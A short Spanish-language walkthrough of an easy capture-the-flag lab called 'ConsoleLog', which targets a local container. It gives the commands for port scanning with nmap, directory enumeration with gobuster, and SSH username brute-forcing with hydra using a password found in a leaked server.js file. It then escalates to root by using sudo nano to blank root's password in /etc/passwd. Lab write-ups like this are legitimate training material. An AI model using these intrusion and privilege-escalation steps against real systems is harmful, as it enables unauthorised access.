# \[Fácil] ConsoleLog

Desplegamos el laboratio:

<div align="left">

<figure><img src="../../../.gitbook/assets/image.png" alt="" width="530"><figcaption></figcaption></figure>

</div>

```
// Escaneo de puertos con nmap
nmap --min-rate 3000 172.17.0.2 -n -v -Pn -p- -sCV -oG scan
```

<div align="left">

<figure><img src="../../../.gitbook/assets/image (1).png" alt="" width="467"><figcaption></figcaption></figure>

</div>

Hacemos un escaneo de carpetas y fichero en la web con gobuster

```
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,sh,py
```

<div align="left">

<figure><img src="../../../.gitbook/assets/image (2).png" alt="" width="563"><figcaption></figcaption></figure>

</div>

En el fichero backend econtramos el fichero server.js que nos proporciona una contraseña  que seguramente sea para el ssh

<div align="left">

<figure><img src="../../../.gitbook/assets/image (3).png" alt="" width="563"><figcaption></figcaption></figure>

</div>

Si hacemos una fuerza bruta al servicio ssh en busca de un usuario encontramos que sea llama lovely

```
hydra -L /usr/share/wordlists/rockyou.txt -p lapassworddebackupmaschingonadetodas ssh://172.17.0.2:5000 -t 16
```

<div align="left">

<figure><img src="../../../.gitbook/assets/image (4).png" alt="" width="563"><figcaption></figcaption></figure>

</div>

Accedemos y vemos que tenemos privilegios de administrador para el comando nano

<div align="left">

<figure><img src="../../../.gitbook/assets/image (5).png" alt="" width="563"><figcaption></figcaption></figure>

</div>

Podemos modificar el fichero /etc/passwd y quitando la x de root, quitamos la contraseña del usuario&#x20;

```
sudo /usr/bin/nano /etc/passwd
```

<div align="left">

<figure><img src="../../../.gitbook/assets/image (6).png" alt="" width="469"><figcaption></figcaption></figure>

</div>

<div align="left">

<figure><img src="../../../.gitbook/assets/image (7).png" alt="" width="347"><figcaption></figcaption></figure>

</div>
